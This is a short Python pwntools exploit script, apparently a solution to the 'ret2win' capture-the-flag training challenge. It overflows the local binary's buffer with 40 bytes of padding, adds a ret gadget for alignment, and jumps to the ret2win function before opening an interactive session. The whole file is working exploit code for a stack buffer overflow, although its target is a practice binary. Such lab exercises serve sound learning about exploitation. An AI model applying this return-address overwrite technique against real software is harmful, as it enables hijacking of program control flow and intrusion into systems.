from pwn import *

binary = './ret2win'
elf = context.binary = ELF(binary)

p = process(binary)

payload = b'a'*40
payload+= p64(0x000000000040053e) #ret
payload+= p64(elf.sym['ret2win'])

p.sendline(payload)
p.interactive()